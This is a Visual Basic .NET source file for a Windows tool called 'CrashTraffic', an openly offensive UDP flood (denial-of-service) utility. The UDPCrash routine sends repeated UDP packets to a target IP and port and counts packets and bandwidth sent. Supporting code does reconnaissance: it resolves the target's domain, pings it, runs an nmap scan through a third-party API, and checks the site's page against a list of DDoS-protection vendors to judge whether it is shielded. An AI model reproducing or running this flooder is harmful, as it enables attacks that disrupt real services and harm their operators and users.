Imports System.Net.NetworkInformation
Imports System
Imports System.Collections.Generic
Imports System.Linq
Imports System.Net
Imports System.Text
Imports System.Threading
Imports System.Threading.Tasks
Imports System.Net.Sockets
Imports Microsoft.VisualBasic.CompilerServices

Public Class CrashTraffic
    Dim t1 = New Thread(AddressOf UDPCrash)

    Dim DDOS_PROTECTORS As String = "cloudflare, amazon, noodler, allot, datadom, akamai, mlytics, myrasecurity, protection, azure, aws, arbor networks, nexusguard, sucuri, neustar"

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        If TextBox1.Text.Contains("https") Then
            Label2.Text = "SSL: True"
        Else
            Label2.Text = "SSL: False"
        End If
        Label3.Text = "DDOS Protection: ..."

        Label5.Text = "Connection Time: ..."
        Label8.Text = "Website Status: ..."
        DomainToIP()
        SITE_CHECK()
        DDOS_CHECK()
        NmAp()

        Pinger()
        Dim g As String
        g = TextBox1.Text
        g.Replace("https", "")
        g.Replace("http", "")
        g.Replace("/", "")
        g.Replace("//", "")
        g.Replace(":", "")
        g.Replace("http", "")

        TextBox2.Text = g
    End Sub
    Public Async Sub NmAp()
        Dim w As New Net.WebClient
        Dim v As String
        v = Await w.DownloadStringTaskAsync(New Uri("https://api.hackertarget.com/nmap/?q=" & Label10.Text))
        TextBox5.Text = v
    End Sub
    Public Async Sub SITE_CHECK()
        Dim w As New Net.WebClient
        Dim v As String
        Try
            v = Await w.DownloadStringTaskAsync(New Uri(TextBox1.Text))
            Label8.Text = "Website Status: Online"

        Catch ex As Exception
            Label8.Text = "Website Status: Offline"
        End Try
    End Sub
    Public Async Sub DDOS_CHECK()
        Dim w As New Net.WebClient
        Dim v As String
        Try
            v = Await w.DownloadStringTaskAsync(New Uri(TextBox1.Text))
            If v.Contains(TextBoxDDOS.Text) Then
                Label3.Text = "DDOS Protection: True"
            Else
                Label3.Text = "DDOS Protection: False"
            End If
        Catch ex As Exception
            Label3.Text = "DDOS Protection: Failed to connect with: " & TextBox1.Text
        End Try
    End Sub

    Public Sub Pinger()
        Try
            Dim ping As New Ping
            Dim reply As PingReply = ping.Send(Label10.Text, NumericUpDown1.Value)
            ListBox1.Items.Add("CrashTraffic> Connection Delay: " & reply.RoundtripTime & " To IP-Adress: " & Label10.Text & " Response: " & reply.Status.ToString)
            Label5.Text = "Connection Time: " & reply.RoundtripTime & " Milliseconds"
        Catch ex As Exception


        End Try

    End Sub

    Public Sub UDPCrash()
        Dim i As Integer

        For i = 1 To NumericUpDown2.Value
            Try
                Dim random As Random = New Random()
                Dim num As Integer = TextBox4.Text
                Dim udpClient As UdpClient = New UdpClient()
                Dim array As Byte() = New Byte(-1) {}
                Dim addr As IPAddress = IPAddress.Parse(Me.Label10.Text)
                udpClient.Connect(addr, num)
                array = Encoding.ASCII.GetBytes(Me.TextBox3.Text)
                udpClient.Send(array, array.Length)
                Me.Label18.Text += 1
                Me.Label20.Text = Conversions.ToString(num)
                Me.Label21.Text = Conversions.ToString(CDbl(array.Length) / 1024.0)
                Dim num2 As Integer = CInt(Math.Round(1000.0 / CDbl(1)))
                Dim value As Integer = CInt(Math.Round(CDbl(array.Length) / 1024.0 * CDbl(num2)))
                Me.Label26.Text = Conversions.ToString(value + Label26.Text)

            Catch ex As Exception

                Label30.Text += 1
            End Try


        Next


        t1.join
        t1.start
    End Sub
    Private Sub CrashTraffic_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        TextBoxDDOS.Text = DDOS_PROTECTORS
        CheckForIllegalCrossThreadCalls = False

    End Sub
    Private Sub DomainToIP()
        Try
            Dim host = Net.Dns.GetHostEntry(TextBox2.Text)
            For Each ip In host.AddressList
                If ip.AddressFamily = Net.Sockets.AddressFamily.InterNetwork Then
                    Label10.Text = ip.ToString

                End If

            Next
        Catch ex As Exception
            Label10.Text = "Error, failed to get IP Adress."
        End Try


    End Sub

    Private Sub TrackBar1_Scroll(sender As Object, e As EventArgs) Handles TrackBar1.Scroll
        Label17.Text = TrackBar1.Value
        PingerT.Interval = TrackBar1.Value

    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        PingerT.Start()

    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        PingerT.Stop()

    End Sub

    Private Sub PingerT_Tick(sender As Object, e As EventArgs) Handles PingerT.Tick
        Pinger()
    End Sub

    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
        ListBox1.Items.Clear()

    End Sub

    Private Sub Button5_Click(sender As Object, e As EventArgs) Handles Button5.Click
        t1.Start


    End Sub

    Private Sub Button7_Click(sender As Object, e As EventArgs) Handles Button7.Click
        TextBox1.Text = ""
        TextBox2.Text = ""
        Label10.Text = ""
    End Sub

    Private Sub Button6_Click(sender As Object, e As EventArgs) Handles Button6.Click
        t1.stop
    End Sub


End Class